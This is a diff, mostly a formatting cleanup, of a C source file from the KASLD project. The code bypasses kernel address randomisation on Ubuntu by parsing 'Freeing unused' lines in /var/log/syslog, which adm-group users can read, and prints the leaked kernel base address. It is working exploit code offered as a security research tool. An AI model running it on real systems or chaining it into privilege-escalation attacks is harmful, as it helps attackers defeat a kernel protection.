@@ -1,5 +1,7 @@
 // This file is part of KASLD - https://github.com/bcoles/kasld
-// free_reserved_area() syslog KASLR bypass
+//
+// free_reserved_area() syslog KASLR bypass for SMP kernels.
+//
 // On Ubuntu systems, `kernel.dmesg_restrict` can be bypassed by
 // users in the `adm` group, due to file read permissions on log
 // files in `/var/log/`.
@@ -9,20 +11,20 @@
 // -rw-r----- 1 syslog adm 1115029 Dec 31 04:24 /var/log/syslog
 //
 // free_reserved_area() leak was patched in 2016:
-// - https://lore.kernel.org/patchwork/patch/728905/
+// https://lore.kernel.org/patchwork/patch/728905/
+//
 // Mostly taken from original code by xairy:
-// - https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c
+// https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c
 
 #define _GNU_SOURCE
-
 #include <fcntl.h>
-#include <stdio.h>
 #include <stdint.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
 #include <sys/mman.h>
 #include <sys/utsname.h>
+#include <unistd.h>
 
 // https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
 unsigned long KERNEL_BASE_MIN = 0xffffffff80000000ul;
@@ -53,25 +55,29 @@ unsigned long get_kernel_addr_free_reserved_area_syslog() {
     return 0;
   }
 
-  while((fgets(buff, CHUNK_SIZE, f)) != NULL) {
-    const char* needle1 = "Freeing unused";
-    char* substr = (char*)memmem(&buff[0], CHUNK_SIZE, needle1, strlen(needle1));
+  while ((fgets(buff, CHUNK_SIZE, f)) != NULL) {
+    const char *needle1 = "Freeing unused";
+    char *substr =
+        (char *)memmem(&buff[0], CHUNK_SIZE, needle1, strlen(needle1));
 
     if (substr == NULL)
       continue;
 
     int start = 0;
     int end = 0;
-    for (start = 0; substr[start] != '-'; start++);
-    for (end = start; substr[end] != '\n'; end++);
+    for (start = 0; substr[start] != '-'; start++)
+      ;
+    for (end = start; substr[end] != '\n'; end++)
+      ;
 
-    const char* needle2 = "ffffff";
-    substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));
+    const char *needle2 = "ffffff";
+    substr =
+        (char *)memmem(&substr[start], end - start, needle2, strlen(needle2));
 
     if (substr == NULL)
       continue;
 
-    char* endptr = &substr[16];
+    char *endptr = &substr[16];
     addr = strtoul(&substr[0], &endptr, 16);
     break;
   }
@@ -84,7 +90,7 @@ unsigned long get_kernel_addr_free_reserved_area_syslog() {
   return 0;
 }
 
-int main (int argc, char **argv) {
+int main(int argc, char **argv) {
   unsigned long addr = 0;
 
   struct utsname u = get_kernel_version();
@@ -95,7 +101,8 @@ int main (int argc, char **argv) {
   }
 
   addr = get_kernel_addr_free_reserved_area_syslog();
-  if (!addr) return 1;
+  if (!addr)
+    return 1;
 
   printf("leaked address: %lx\n", addr);
 
@@ -103,8 +110,8 @@ int main (int argc, char **argv) {
   printf("kernel base (likely): %lx\n", addr & 0xffffffffff000000ul);
 
   /* ubuntu xenial */
-  printf("kernel base (likely): %lx\n", (addr & 0xfffffffffff00000ul) - 0x1000000ul);
+  printf("kernel base (likely): %lx\n",
+         (addr & 0xfffffffffff00000ul) - 0x1000000ul);
 
   return 0;
 }
-
